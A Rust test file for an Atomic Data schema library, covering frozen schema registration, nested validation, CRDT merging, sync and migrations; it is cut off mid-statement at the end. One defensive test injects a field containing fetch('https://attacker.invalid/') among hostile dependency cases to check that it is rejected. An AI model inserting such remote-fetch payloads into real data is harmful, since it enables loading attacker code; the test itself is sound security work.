use super::{
    app::{AppSchema, Field},
    frozen,
    shape::Shape,
};
use crate::{Db, Resource, Storelike, Value};
use serde_json::json;

fn audio() -> AppSchema {
    AppSchema::define(
        "audio-slice",
        [
            (
                "tune".into(),
                Field {
                    required: true,
                    shape: Shape::Number {
                        minimum: Some(-48.),
                        maximum: Some(48.),
                    },
                },
            ),
            (
                "envelope".into(),
                Field {
                    required: true,
                    shape: serde_json::from_value(json!({
                        "type":"object", "properties": {
                            "attack":{"type":"number","minimum":0,"maximum":2},
                            "release":{"type":"number","minimum":0,"maximum":4}
                        }, "required":["attack","release"], "additionalProperties": false
                    }))
                    .unwrap(),
                },
            ),
        ]
        .into(),
    )
    .unwrap()
}

#[tokio::test]
async fn registered_schema_validates_nested_data_and_rejects_mutation() {
    let store = Db::init_temp("schema-registered").await.unwrap();
    let schema = audio();
    schema.register(&store).await.unwrap();
    schema.register(&store).await.unwrap();
    assert!(schema.class_id.starts_with("atomic:frozen:"));
    let property = schema.property("envelope").unwrap();
    assert!(store.get_property(property).await.is_ok());
    let mut resource = schema.new_resource("atomic:example".into()).unwrap();
    assert!(resource.check_required_props(&store).await.is_err());
    schema
        .set(&mut resource, "tune", json!(7), &store)
        .await
        .unwrap();
    schema
        .set(
            &mut resource,
            "envelope",
            json!({"attack":0.01,"release":0.2}),
            &store,
        )
        .await
        .unwrap();
    resource.check_required_props(&store).await.unwrap();
    assert!(schema
        .patch(
            &mut resource,
            "envelope",
            &["attack"],
            Some(json!(5)),
            &store
        )
        .await
        .is_err());
    assert_eq!(
        resource.get(property).unwrap().to_string(),
        json!({"attack":0.01,"release":0.2}).to_string()
    );
    assert!(schema
        .patch(&mut resource, "envelope", &["attack"], None, &store)
        .await
        .is_err());
    // A raw write must fail on persistence too; SDK validation is not the boundary.
    resource
        .set_unsafe(
            property.into(),
            Value::Json(json!({"attack":5,"release":0.2})),
        )
        .unwrap();
    assert!(store.add_resource(&resource).await.is_err());
    let definition = store.get_resource(&property.into()).await.unwrap();
    assert!(definition.materialized_state().is_none());
    let mut tampered = definition.clone();
    assert!(tampered
        .set_unsafe(
            crate::urls::DESCRIPTION.into(),
            Value::String("changed".into())
        )
        .is_err());
    let mut values = definition.get_propvals().clone();
    values.insert(
        crate::urls::DESCRIPTION.into(),
        Value::String("changed".into()),
    );
    let tampered = Resource::from_propvals(values, definition.get_subject().clone());
    assert!(store
        .add_resource_opts(&tampered, false, false, true)
        .await
        .is_err());
    assert!(frozen::verify(&definition).is_ok());
    let alias = property.replacen("atomic:", "did:ad:", 1);
    assert_eq!(
        frozen::body(&store.get_resource(&alias.as_str().into()).await.unwrap()).unwrap(),
        frozen::body(&definition).unwrap()
    );
}

#[tokio::test]
async fn nested_edits_merge_without_replacing_the_envelope() {
    let store = Db::init_temp("schema-merge").await.unwrap();
    let schema = audio();
    schema.register(&store).await.unwrap();
    let mut base = schema.new_resource("atomic:base".into()).unwrap();
    schema
        .set(&mut base, "tune", json!(0), &store)
        .await
        .unwrap();
    schema
        .set(
            &mut base,
            "envelope",
            json!({"attack":0.01,"release":0.2}),
            &store,
        )
        .await
        .unwrap();
    let snapshot = base.build_state_doc().unwrap().export_snapshot();
    let mut left = Resource::new("atomic:base".into());
    left.apply_state_doc(crate::loro::AtomicLoroDoc::from_snapshot(&snapshot).unwrap())
        .unwrap();
    let mut right = Resource::new("atomic:base".into());
    right
        .apply_state_doc(crate::loro::AtomicLoroDoc::from_snapshot(&snapshot).unwrap())
        .unwrap();
    schema
        .patch(
            &mut left,
            "envelope",
            &["attack"],
            Some(json!(0.05)),
            &store,
        )
        .await
        .unwrap();
    schema
        .patch(
            &mut right,
            "envelope",
            &["release"],
            Some(json!(0.9)),
            &store,
        )
        .await
        .unwrap();
    let merged = left.build_state_doc().unwrap();
    merged
        .doc()
        .import(&right.build_state_doc().unwrap().export_snapshot())
        .unwrap();
    let mut result = Resource::new("atomic:base".into());
    result.apply_state_doc(merged).unwrap();
    assert_eq!(
        result
            .get(schema.property("envelope").unwrap())
            .unwrap()
            .to_string(),
        json!({"attack":0.05,"release":0.9}).to_string()
    );
}

#[test]
fn shape_errors_are_explicit_and_bounded() {
    assert!(serde_json::from_value::<Shape>(json!({"type":"string","pattern":".*"})).is_err());
    let shape: Shape =
        serde_json::from_value(json!({"type":"array","items":{"type":"integer"},"maxItems":2}))
            .unwrap();
    assert!(shape.validate(&json!([1, 2])).is_ok());
    assert!(shape.validate(&json!([1, 2, 3])).is_err());
    assert!(shape.validate(&json!([1, 1.5])).is_err());
    assert!(Shape::Reference
        .validate(&json!("a literal, not a link"))
        .is_err());
    assert!(Shape::Reference.validate(&json!("atomic:example")).is_ok());
    assert_ne!(
        audio().class_id,
        AppSchema::define("different-meaning", Default::default())
            .unwrap()
            .class_id
    );
}

#[tokio::test]
async fn browser_and_native_share_identity_and_merge_nested_edits() {
    let fixture: serde_json::Value =
        serde_json::from_str(include_str!("../../tests/fixtures/app-schema.json")).unwrap();
    let schema: AppSchema = serde_json::from_value(fixture["bundle"].clone()).unwrap();
    assert_eq!(
        serde_jcs::to_vec(&audio()).unwrap(),
        serde_jcs::to_vec(&fixture["bundle"]).unwrap()
    );
    let store = Db::init_temp("schema-browser-fixture").await.unwrap();
    assert!(store
        .get_resource(&schema.class_id.as_str().into())
        .await
        .is_err());
    let native = crate::agents::decode_base64(fixture["rust_edit"].as_str().unwrap()).unwrap();
    let browser =
        crate::agents::decode_base64(fixture["typescript_edit"].as_str().unwrap()).unwrap();
    let doc = crate::loro::AtomicLoroDoc::from_snapshot(&native).unwrap();
    doc.doc().import(&browser).unwrap();
    let mut resource = Resource::new("atomic:example".into());
    resource.apply_state_doc(doc).unwrap();
    resource.check_required_props(&store).await.unwrap();
    store.persist_replicated_resource(&resource).await.unwrap();
    assert!(store
        .get_resource(&schema.class_id.as_str().into())
        .await
        .is_ok());
    assert_eq!(
        resource
            .get(schema.property("envelope").unwrap())
            .unwrap()
            .to_string(),
        json!({"attack":0.05,"release":0.9}).to_string()
    );
}

#[tokio::test]
async fn commits_cannot_edit_or_delete_frozen_resources_even_without_validations() {
    let store = Db::init_temp("schema-commit").await.unwrap();
    let schema = audio();
    schema.register(&store).await.unwrap();
    for destroy in [false, true] {
        let commit = crate::commit::Commit {
            subject: schema.class_id.clone().into(),
            created_at: 0,
            signer: "atomic:agent:test".into(),
            loro_update: None,
            destroy: Some(destroy),
            signature: None,
            previous_commit: None,
            is_genesis: None,
            url: None,
        };
        let error = commit
            .validate_and_build_response(
                &crate::commit::CommitOpts::no_validations_no_index(),
                &store,
            )
            .await
            .unwrap_err();
        assert!(error.to_string().contains("Frozen definitions"));
    }
}

#[cfg(feature = "db-redb")]
#[tokio::test]
async fn frozen_definitions_survive_database_reopen_without_crdt_metadata() {
    let path = std::env::temp_dir().join(format!(
        "atomic-schema-{}-{}",
        std::process::id(),
        rand::random::<u64>()
    ));
    std::fs::create_dir_all(&path).unwrap();
    let schema = audio();
    {
        let store = Db::init_redb_file(&path.join("db.redb"), None, &path.join("uploads"))
            .await
            .unwrap();
        schema.register(&store).await.unwrap();
    }
    {
        let store = Db::init_redb_file(&path.join("db.redb"), None, &path.join("uploads"))
            .await
            .unwrap();
        for (id, expected) in &schema.definitions {
            let resource = store.get_resource(&id.as_str().into()).await.unwrap();
            assert_eq!(&frozen::body(&resource).unwrap(), expected);
            assert!(resource.materialized_state().is_none());
        }
    }
    std::fs::remove_dir_all(&path).unwrap();
}

#[test]
fn null_members_survive_native_json_materialization() {
    let value = json!({"optional":null,"items":[null,null]});
    let mut resource = Resource::new("atomic:null-test".into());
    resource
        .set_unsafe("urn:json".into(), Value::Json(value.clone()))
        .unwrap();
    let doc = resource.build_state_doc().unwrap();
    let mut reloaded = Resource::new("atomic:null-test".into());
    reloaded.apply_state_doc(doc).unwrap();
    assert_eq!(
        reloaded.get("urn:json").unwrap().to_string(),
        value.to_string()
    );
}

#[tokio::test]
async fn schema_validating_commit_rejects_an_invalid_nested_update() {
    let store = Db::init_temp("schema-remote-write").await.unwrap();
    let schema = audio();
    schema.register(&store).await.unwrap();
    let mut resource = schema
        .new_resource("https://example.com/audio-slice".into())
        .unwrap();
    schema
        .set(&mut resource, "tune", json!(0), &store)
        .await
        .unwrap();
    schema
        .set(
            &mut resource,
            "envelope",
            json!({"attack":0.01,"release":0.2}),
            &store,
        )
        .await
        .unwrap();
    store.add_resource(&resource).await.unwrap();
    resource
        .set_unsafe(
            schema.property("envelope").unwrap().into(),
            Value::Json(json!({"attack":99,"release":0.2})),
        )
        .unwrap();
    let commit = crate::commit::Commit {
        subject: resource.get_subject().clone(),
        created_at: 0,
        signer: "atomic:agent:test".into(),
        loro_update: Some(resource.build_state_doc().unwrap().export_snapshot()),
        destroy: None,
        signature: None,
        previous_commit: None,
        is_genesis: None,
        url: None,
    };
    let mut opts = crate::commit::CommitOpts::no_validations_no_index();
    opts.validate_schema = true;
    let error = commit
        .validate_and_build_response(&opts, &store)
        .await
        .unwrap_err();
    assert!(error.to_string().contains("$/attack"), "{error}");
}

async fn slice(store: &Db) -> (AppSchema, Resource) {
    let schema = audio();
    schema.register(store).await.unwrap();
    let mut resource = schema
        .new_resource("atomic:schema-sync-slice".into())
        .unwrap();
    schema
        .set(&mut resource, "tune", json!(7), store)
        .await
        .unwrap();
    schema
        .set(
            &mut resource,
            "envelope",
            json!({"attack":0.01,"release":0.2}),
            store,
        )
        .await
        .unwrap();
    (schema, resource)
}

#[tokio::test]
async fn cold_sync_push_installs_dependencies_and_delta_reuses_them() {
    use crate::{
        agents::ForAgent,
        db::trees::Tree,
        sync::{engine, protocol},
    };
    let source = Db::init_temp("schema-sync-source").await.unwrap();
    let (alice, drive) = source.setup("Alice").await.unwrap();
    let (schema, mut resource) = slice(&source).await;
    resource
        .set_unsafe(
            crate::urls::PARENT.into(),
            Value::AtomicUrl(drive.clone().into()),
        )
        .unwrap();
    resource
        .set_unsafe(
            crate::urls::DRIVE_PROP.into(),
            Value::AtomicUrl(drive.clone().into()),
        )
        .unwrap();
    let doc = resource.build_state_doc().unwrap();
    let snapshot = doc.export_snapshot();
    let version = doc.doc().oplog_vv();
    let drive_snapshot = source
        .kv
        .get(Tree::LoroSnapshots, drive.as_bytes())
        .unwrap()
        .unwrap();
    let frame = protocol::encode_sync_push(
        &drive,
        &[
            (&drive, &drive_snapshot),
            (resource.get_subject().as_str(), &snapshot),
        ],
        true,
    );
    let sink = Db::init_temp("schema-sync-cold").await.unwrap();
    let mut agent = ForAgent::from(alice);
    let output = engine::handle_frame_full(&frame, &sink, &mut agent).await;
    assert!(output.frames.iter().any(|f| f[0] == protocol::tag::SYNC_OK));
    for id in schema.definitions.keys() {
        assert!(sink.get_resource(&id.as_str().into()).await.is_ok());
        // The cache does not introduce a public schema-by-hash read path.
        assert!(sink
            .get_resource_extended(&id.as_str().into(), true, &ForAgent::Public)
            .await
            .is_err());
    }
    schema
        .patch(
            &mut resource,
            "envelope",
            &["release"],
            Some(json!(0.7)),
            &source,
        )
        .await
        .unwrap();
    let delta = resource
        .build_state_doc()
        .unwrap()
        .export_updates_since(&version);
    assert!(delta.len() < snapshot.len());
    let frame =
        protocol::encode_sync_push(&drive, &[(resource.get_subject().as_str(), &delta)], true);
    let output = engine::handle_frame_full(&frame, &sink, &mut agent).await;
    assert!(output.frames.iter().any(|f| f[0] == protocol::tag::SYNC_OK));
    let received = sink.get_resource(resource.get_subject()).await.unwrap();
    assert_eq!(
        received
            .get(schema.property("envelope").unwrap())
            .unwrap()
            .to_string(),
        json!({"attack":0.01,"release":0.7}).to_string()
    );
}

#[tokio::test]
async fn hostile_dependencies_leave_no_resource_or_cache_entries() {
    use super::dependencies::ROOT;
    let source = Db::init_temp("schema-hostile-source").await.unwrap();
    let (schema, resource) = slice(&source).await;
    for attack in [
        "tamper",
        "missing",
        "noncanonical",
        "wrong-type",
        "too-many",
        "too-big",
        "code",
    ] {
        let sink = Db::init_temp(&format!("schema-hostile-{attack}"))
            .await
            .unwrap();
        let doc = resource.build_state_doc().unwrap();
        let map = doc.doc().get_map(ROOT);
        match attack {
            "tamper" => {
                map.insert(&schema.class_id, "{}").unwrap();
            }
            "missing" => {
                map.delete(&schema.class_id).unwrap();
            }
            "noncanonical" => {
                map.insert(
                    &schema.class_id,
                    serde_json::to_string_pretty(&schema.definitions[&schema.class_id]).unwrap(),
                )
                .unwrap();
            }
            "wrong-type" => {
                map.insert(&schema.class_id, 1).unwrap();
            }
            "too-many" => {
                for n in 0..513 {
                    map.insert(&format!("key-{n}"), "{}").unwrap();
                }
            }
            "too-big" => {
                map.insert(&schema.class_id, "x".repeat(frozen::MAX_BYTES + 1))
                    .unwrap();
            }
            "code" => {
                let mut body = schema.definitions[&schema.class_id].clone();
                body["urn:migration:execute"] = json!("fetch('https://attacker.invalid/')");
                let id = frozen::id(&body).unwrap();
                map.insert(&id, serde_jcs::to_string(&body).unwrap())
                    .unwrap();
            }
            _ => unreachable!(),
        }
        let mut incoming = Resource::new(resource.get_subject().to_string());
        incoming.apply_state_doc(doc).unwrap();
        let error = sink
            .persist_replicated_resource(&incoming)
            .await
            .unwrap_err();
        assert!(
            error.to_string().contains(incoming.get_subject().as_str()),
            "{attack}: {error}"
        );
        let error = sink
            .persist_replicated_resources(vec![(incoming.clone(), None)])
            .await
            .unwrap_err();
        assert!(
            error.to_string().contains(incoming.get_subject().as_str()),
            "{attack}: {error}"
        );
        assert!(
            sink.get_resource(resource.get_subject()).await.is_err(),
            "{attack}"
        );
        for id in schema.definitions.keys() {
            assert!(
                sink.get_resource(&id.as_str().into()).await.is_err(),
                "{attack}"
            );
        }
    }
}

#[tokio::test]
async fn rejected_sync_never_acknowledges_or_installs_definitions() {
    use crate::{
        agents::ForAgent,
        sync::{engine, protocol},
    };
    let source = Db::init_temp("schema-sync-reject-source").await.unwrap();
    let (schema, mut resource) = slice(&source).await;
    let sink = Db::init_temp("schema-sync-reject-sink").await.unwrap();
    let (alice, drive) = sink.setup("Alice").await.unwrap();
    resource
        .set_unsafe(
            crate::urls::PARENT.into(),
            Value::AtomicUrl(drive.clone().into()),
        )
        .unwrap();
    resource
        .set_unsafe(
            crate::urls::DRIVE_PROP.into(),
            Value::AtomicUrl(drive.clone().into()),
        )
        .unwrap();
    for authorized in [false, true] {
        let doc = resource.build_state_doc().unwrap();
        if authorized {
            doc.doc()
                .get_map(super::dependencies::ROOT)
                .insert(&schema.class_id, "{}")
                .unwrap();
        }
        let frame = protocol::encode_sync_push(
            &drive,
            &[(resource.get_subject().as_str(), &doc.export_snapshot())],
            true,
        );
        let mut agent = if authorized {
            ForAgent::from(alice.clone())
        } else {
            ForAgent::Public
        };
        let output = engine::handle_frame_full(&frame, &sink, &mut agent).await;
        assert!(output.frames.iter().any(|f| f[0] == protocol::tag::ERROR));
        assert!(!output.frames.iter().any(|f| f[0] == protocol::tag::SYNC_OK));
        for id in schema.definitions.keys() {
            assert!(sink.get_resource(&id.as_str().into()).await.is_err());
        }
        assert!(sink.get_resource(resource.get_subject()).await.is_err());
    }
}

#[tokio::test]
async fn migration_coexists_with_concurrent_old_client_edits() {
    let store = Db::init_temp("schema-migration-author").await.unwrap();
    let (v1, mut migrated) = slice(&store).await;
    let base = migrated.build_state_doc().unwrap().export_snapshot();
    let mut old_client = Resource::new(migrated.get_subject().to_string());
    old_client
        .apply_state_doc(crate::loro::AtomicLoroDoc::from_snapshot(&base).unwrap())
        .unwrap();
    // A new representation gets new IDs. The app explicitly converts semitones
    // to cents, preserving the old property for older writers.
    let v2 = AppSchema::define(
        "audio-slice-cents",
        [(
            "cents".into(),
            Field {
                required: true,
                shape: Shape::Integer {
                    minimum: Some(-4800.),
                    maximum: Some(4800.),
                },
            },
        )]
        .into(),
    )
    .unwrap();
    v2.register(&store).await.unwrap();
    v2.set(&mut migrated, "cents", json!(700), &store)
        .await
        .unwrap();
    migrated
        .set_unsafe(
            crate::urls::IS_A.into(),
            Value::ResourceArray(vec![v2.class_id.clone().into()]),
        )
        .unwrap();
    super::dependencies::attach(&mut migrated, &store)
        .await
        .unwrap();
    v1.set(&mut old_client, "tune", json!(9), &store)
        .await
        .unwrap();
    let merged = migrated.build_state_doc().unwrap();
    merged
        .import_update(&old_client.build_state_doc().unwrap().export_snapshot())
        .unwrap();
    migrated.apply_state_doc(merged).unwrap();
    let cold = Db::init_temp("schema-migration-cold").await.unwrap();
    cold.persist_replicated_resource(&migrated).await.unwrap();
    assert_eq!(
        migrated
            .get(v1.property("tune").unwrap())
            .unwrap()
            .to_string(),
        "9"
    );
    assert_eq!(
        migrated
            .get(v2.property("cents").unwrap())
            .unwrap()
            .to_string(),
        "700"
    );
    // CRDT convergence preserves both edits. It does not recompute converted
    // values: reconciling 900 vs 700 cents is an explicit application decision.
    assert!(cold
        .get_resource(&v1.property("tune").unwrap().into())
        .await
        .is_ok());
    assert!(cold
        .get_resource(&v2.class_id.as_str().into())
        .await
        .is_ok());
    // Stale, valid attached definitions are not installed just for existing.
    assert!(cold
        .get_resource(&v1.class_id.as_str().into())
        .await
        .is_err());
    let mut historical = Resource::new("atomic:historical-slice".into());
    historical
        .apply_state_doc(crate::loro::AtomicLoroDoc::from_snapshot(&base).unwrap())
        .unwrap();
    cold.persist_replicated_resource(&historical).await.unwrap();
    assert!(cold
        .get_resource(&v1.class_id.as_str().into())
        .await
        .is_ok());
}

#[tokio::test]
async fn dependency_traversal_and_aggregate_bytes_are_bounded() {
    use super::dependencies::ROOT;
    let store = Db::init_temp("schema-budget").await.unwrap();
    for deep in [false, true] {
        let doc = crate::loro::AtomicLoroDoc::new();
        let map = doc.doc().get_map(ROOT);
        let mut previous = None;
        for index in 0..if deep { 19 } else { 5 } {
            let body = json!({
                crate::urls::IS_A:[crate::urls::CLASS],
                crate::urls::SHORTNAME:format!("class-{index}"),
                crate::urls::DESCRIPTION:if deep { String::new() } else { "x".repeat(220 * 1024) },
                crate::urls::REQUIRES: previous.iter().collect::<Vec<_>>(),
                crate::urls::RECOMMENDS:[],
            });
            let id = frozen::id(&body).unwrap();
            map.insert(&id, serde_jcs::to_string(&body).unwrap())
                .unwrap();
            previous = Some(id);
        }
        doc.set_property(
            crate::urls::IS_A,
            &Value::ResourceArray(vec![previous.unwrap().into()]),
        )
        .unwrap();
        let mut resource = Resource::new("atomic:bounded-dependencies".into());
        resource.apply_state_doc(doc).unwrap();
        let error = super::dependencies::resolve(&resource, &store)
            .await
            .unwrap_err();
        assert!(
            error.to_string().contains(if deep {
                "traversal limit"
            } else {
                "byte budget"
            }),
            "{error}"
        );
    }
}

#[tokio::test]
async fn cold_commit_validates_attachments_without_registering_them_during_validation() {
    let source = Db::init_temp("schema-cold-commit-source").await.unwrap();
    let (schema, resource) = slice(&source).await;
    let sink = Db::init_temp("schema-cold-commit-sink").await.unwrap();
    let commit = crate::commit::Commit {
        subject: "https://example.com/cold-commit".into(),
        created_at: 0,
        signer: "atomic:agent:test".into(),
        loro_update: Some(resource.build_state_doc().unwrap().export_snapshot()),
        destroy: None,
        signature: None,
        previous_commit: None,
        is_genesis: None,
        url: None,
    };
    let mut opts = crate::commit::CommitOpts::no_validations_no_index();
    opts.validate_schema = true;
    let response = commit
        .validate_and_build_response(&opts, &sink)
        .await
        .unwrap();
    for id in schema.definitions.keys() {
        assert!(sink.get_resource(&id.as_str().into()).await.is_err());
    }
    sink.persist_replicated_resource(&response.resource_new.unwrap())
        .await
        .unwrap();
    for id in schema.definitions.keys() {
        assert!(sink.get_resource(&id.as_str().into()).await.is_ok());
    }
}

#[tokio::test]
async fn builder_authoring_and_authorized_get_retrieve_schemas_automatically() {
    use crate::{
        agents::ForAgent,
        commit::{Commit, CommitBuilder, CommitOpts},
        sync::{engine, protocol},
    };
    let source = Db::init_temp("schema-builder-source").await.unwrap();
    let (alice, drive) = source.setup("Alice").await.unwrap();
    let schema = audio();
    schema.register(&source).await.unwrap();
    let mut builder = CommitBuilder::new("placeholder".into());
    builder.set(
        crate::urls::IS_A.into(),
        Value::ResourceArray(vec![schema.class_id.clone().into()]),
    );
    builder.set(crate::urls::PARENT.into(), Value::AtomicUrl(drive.into()));
    builder.set(
        crate::urls::READ.into(),
        Value::ResourceArray(vec![alice.subject.to_string().into()]),
    );
    builder.set(schema.property("tune").unwrap().into(), Value::Float(0.));
    builder.set(
        schema.property("envelope").unwrap().into(),
        Value::Json(json!({"attack":0.01,"release":0.2})),
    );
    let commit = Commit::create_did(builder, &alice, &source).await.unwrap();
    let subject = commit.subject.to_string();
    crate::runtime::AtomicNode::from_db(source.clone())
        .apply_local_commit(
            commit,
            &CommitOpts {
                validate_signature: true,
                validate_schema: true,
                validate_rights: true,
                update_index: true,
                ..CommitOpts::no_validations_no_index()
            },
        )
        .await
        .unwrap();
    let frame = protocol::encode_get(1, &subject);
    let denied = engine::handle_frame_full(&frame, &source, &mut ForAgent::Public).await;
    assert_eq!(denied.frames[0][0], protocol::tag::ERROR);
    let answer = engine::handle_frame_full(&frame, &source, &mut ForAgent::from(alice)).await;
    assert_eq!(answer.frames[0][0], protocol::tag::UPDATE);
    let update = protocol::decode_update(&answer.frames[0][1..]).unwrap();
    let cold = Db::init_temp("schema-builder-recipient").await.unwrap();
    let mut resource = Resource::new(subject);
    resource
        .apply_state_doc(crate::loro::AtomicLoroDoc::from_snapshot(&update.loro_bytes).unwrap())
        .unwrap();
    cold.persist_replicated_resource(&resource).await.unwrap();
    assert!(cold
        .get_resource(&schema.class_id.as_str().into())
        .await
        .is_ok());
}

#[tokio::test]
async fn bindings_aliases_and_models_preserve_identity_and_validate_before_writes() {
    use super::bindings::PropertyBinding;
    let store = Db::init_temp("schema-bindings").await.unwrap();
    let pitch = PropertyBinding::define(
        "music",
        "pitch",
        Shape::Integer {
            minimum: Some(0.),
            maximum: Some(127.),
        },
    )
    .unwrap()
    .required();
    let a = AppSchema::compose("note", "A note", [("pitch".into(), pitch.clone())].into()).unwrap();
    let b = AppSchema::compose("pad", "A pad", [("key".into(), pitch)].into()).unwrap();
    assert_eq!(a.property("pitch").unwrap(), b.property("key").unwrap());
    let renamed = a.rebind("pitch", "midiKey").unwrap();
    assert_eq!(a.class_id, renamed.class_id);
    assert_eq!(a.definitions, renamed.definitions);
    renamed.register(&store).await.unwrap();
    let mut r = renamed.new_resource("atomic:note".into()).unwrap();
    renamed
        .replace_model(&mut r, &json!({"midiKey":60}), &store)
        .await
        .unwrap();
    assert_eq!(renamed.read_field::<i64>(&r, "midiKey").unwrap(), 60);
    let before = r.build_state_doc().unwrap().oplog_vv_bytes();
    assert!(renamed
        .replace_model(&mut r, &json!({"midiKey":200}), &store)
        .await
        .is_err());
    assert_eq!(before, r.build_state_doc().unwrap().oplog_vv_bytes());
    assert_eq!(
        renamed.decode_model::<serde_json::Value>(&r).unwrap(),
        json!({"midiKey":60})
    );
    assert!(renamed
        .replace_model(&mut r, &json!({}), &store)
        .await
        .is_err());
}

#[tokio::test]
async fn movable_list_merge_keeps_edit_attached_to_moved_item() {
    use super::list::ListEdit;
    let store = Db::init_temp("schema-movable-list").await.unwrap();
    let schema = AppSchema::define(
        "steps",
        [(
            "steps".into(),
            Field {
                required: true,
                shape: Shape::Array {
                    items: Box::new(Shape::Integer {
                        minimum: Some(0.),
                        maximum: Some(127.),
                    }),
                    max_items: 4,
                },
            },
        )]
        .into(),
    )
    .unwrap();
    schema.register(&store).await.unwrap();
    let mut base = schema.new_resource("atomic:steps".into()).unwrap();
    schema
        .replace_list(
            &mut base,
            "steps",
            vec![json!(60), json!(64), json!(67)],
            &store,
        )
        .await
        .unwrap();
    let mut a = base.clone();
    let mut b = base.clone();
    schema
        .edit_list(&mut a, "steps", ListEdit::Move { from: 0, to: 2 }, &store)
        .await
        .unwrap();
    schema
        .edit_list(
            &mut b,
            "steps",
            ListEdit::Set {
                index: 0,
                value: json!(61),
            },
            &store,
        )
        .await
        .unwrap();
    let merged = a.build_state_doc().unwrap();
    merged
        .doc()
        .import(&b.build_state_doc().unwrap().export_snapshot())
        .unwrap();
    a.apply_state_doc(merged).unwrap();
    assert_eq!(
        schema.read_field::<serde_json::Value>(&a, "steps").unwrap(),
        json!([64, 67, 61])
    );
    let before = a.build_state_doc().unwrap().oplog_vv_bytes();
    assert!(schema
        .edit_list(
            &mut a,
            "steps",
            ListEdit::Insert {
                index: 0,
                value: json!(200)
            },
            &store
        )
        .await
        .is_err());
    assert_eq!(before, a.build_state_doc().unwrap().oplog_vv_bytes());
    schema
        .set(&mut a, "steps", json!([1, 2]), &store)
        .await
        .unwrap();
    assert!(schema
        .edit_list(&mut a, "steps", ListEdit::Move { from: 0, to: 1 }, &store)
        .await
        .is_err());
}

#[test]
fn extended_shapes_and_generation_are_bounded_and_deterministic() {
    let input: serde_json::Value =
        serde_json::from_str(include_str!("../../tests/fixtures/model-schema.json")).unwrap();
    let schema = AppSchema::define(
        input["input"]["name"].as_str().unwrap(),
        serde_json::from_value(input["input"]["fields"].clone()).unwrap(),
    )
    .unwrap();
    for (field, accepted, rejected) in [
        ("mode", json!("mono"), json!("invalid")),
        ("value", json!({"base":0.5}), json!({"other":1})),
        ("comment", json!(null), json!(42)),
    ] {
        assert!(schema.encode_field(field, &accepted).is_ok());
        assert!(schema.encode_field(field, &rejected).is_err());
    }
    let models = schema.generate_models("ExampleModel").unwrap();
    assert_eq!(
        models.rust,
        include_str!("../../tests/fixtures/generated/model.rs")
    );
    assert_eq!(
        models.dart,
        include_str!("../../tests/fixtures/generated/model.dart")
    );
    let bad: Shape = serde_json::from_value(json!({"type":"enum","values":["x","x"]})).unwrap();
    assert!(bad.check().is_err());
    let bad: Shape =
        serde_json::from_value(json!({"type":"union","variants":[{"type":"null"}]})).unwrap();
    assert!(bad.check().is_err());
}

#[tokio::test]
async fn migration_pins_outputs_rejects_stale_preview_and_resumes_failed_copy() {
    use super::migration::*;
    use crate::errors::AtomicResult;
    use std::collections::BTreeSet;
    let source = Resource::new("atomic:source".into());
    let schema = audio();
    let item = |key: &str| CopyItem {
        key: key.into(),
        schema: schema.clone(),
        fields: json!({"tune":7,"envelope":{"attack":0.01,"release":0.2}})
            .as_object()
            .unwrap()
            .clone(),
    };
    let plan = CopyPlan::prepare(
        "test-v1",
        "atomic:source",
        &schema.class_id,
        std::slice::from_ref(&source),
        vec![item("one"), item("two")],
    )
    .unwrap();
    let revision = plan.preview().revision.clone();
    assert!(plan.check_revision("old").is_err());
    let other = CopyPlan::prepare(
        "test-v2",
        "atomic:source",
        &schema.class_id,
        &[source],
        vec![item("one"), item("two")],
    )
    .unwrap();
    assert_ne!(revision, other.preview().revision);
    struct Target {
        completed: BTreeSet<String>,
        complete: bool,
        writes: usize,
        fail: bool,
    }
    impl CopyTarget for Target {
        async fn begin(&mut self, _: &MigrationPreview) -> AtomicResult<CopyProgress> {
            Ok(CopyProgress {
                subject: "atomic:copy".into(),
                completed: self.completed.clone(),
                complete: self.complete,
            })
        }
        async fn write(&mut self, _: &str, item: &CopyItem) -> AtomicResult<()> {
            if item.key == "two" && self.fail {
                return Err("disk unavailable".into());
            }
            self.completed.insert(item.key.clone());
            self.writes += 1;
            Ok(())
        }
        async fn finish(&mut self, _: &str) -> AtomicResult<()> {
            self.complete = true;
            Ok(())
        }
    }
    let mut target = Target {
        completed: BTreeSet::new(),
        complete: false,
        writes: 0,
        fail: true,
    };
    assert!(plan.apply("old", &mut target).await.is_err());
    assert_eq!(target.writes, 0);
    assert!(plan.apply(&revision, &mut target).await.is_err());
    assert_eq!(target.writes, 1);
    assert!(!target.complete);
    target.fail = false;
    let result = plan.apply(&revision, &mut target).await.unwrap();
    assert!(result.complete);
    assert_eq!(target.writes, 2);
    plan.apply(&revision, &mut target).await.unwrap();
    assert_eq!(target.writes, 2);
}

#[test]
fn compose_identity_does_not_depend_on_alias_sort_order() {
    use super::bindings::PropertyBinding;
    let a = PropertyBinding::define("shared", "a", Shape::Boolean).unwrap();
    let b = PropertyBinding::define("shared", "b", Shape::Boolean).unwrap();
    let first = AppSchema::compose(
        "pair",
        "Pair",
        [("a".into(), a.clone()), ("b".into(), b.clone())].into(),
    )
    .unwrap();
    let renamed =
        AppSchema::compose("pair", "Pair", [("z".into(), a), ("a".into(), b)].into()).unwrap();
    assert_eq!(first.class_id, renamed.class_id);
    assert_eq!(first.definitions, renamed.definitions);
}

#[test]
fn union_branching_has_a_shared_validation_budget() {
    let array = Shape::Array {
        items: Box::new(Shape::Boolean),
        max_items: 16384,
    };
    let shape = Shape::Union {
        variants: vec![array; 8],
    };
    let mut values = vec![json!(true); 16384];
    values[16383] = json!("invalid");
    assert!(shape
        .validate(&json!(values))
        .unwrap_err()
        .to_string()
        .contains("100000"));
}

#[test]
fn json_schema_interchange_corpus_and_identity_roundtrip() {
    let corpus: serde_json::Value = serde_json::from_str(include_str!(
        "../../tests/fixtures/json-schema-interop.json"
    ))
    .unwrap();
    for case in corpus["accepted"].as_array().unwrap() {
        let shape = Shape::from_json_schema(&case["schema"]).unwrap();
        let exported = shape.to_json_schema().unwrap();
        let roundtrip = Shape::from_json_schema(&exported).unwrap();
        for value in case["valid"].as_array().unwrap() {
            assert!(shape.validate(value).is_ok(), "{case}");
            assert!(roundtrip.validate(value).is_ok());
        }
        for value in case["invalid"].as_array().unwrap() {
            assert!(shape.validate(value).is_err(), "{case}");
            assert!(roundtrip.validate(value).is_err());
        }
    }
    for case in corpus["rejected"].as_array().unwrap() {
        assert!(
            Shape::from_json_schema(&case["schema"])
                .unwrap_err()
                .to_string()
                .contains(case["error"].as_str().unwrap()),
            "{case}"
        );
    }
    let original = audio().rebind("tune", "pitch").unwrap();
    let mut document = original.export_json_schema().unwrap();
    document.schema["title"] = json!("A nicer display title");
    document.schema["required"]
        .as_array_mut()
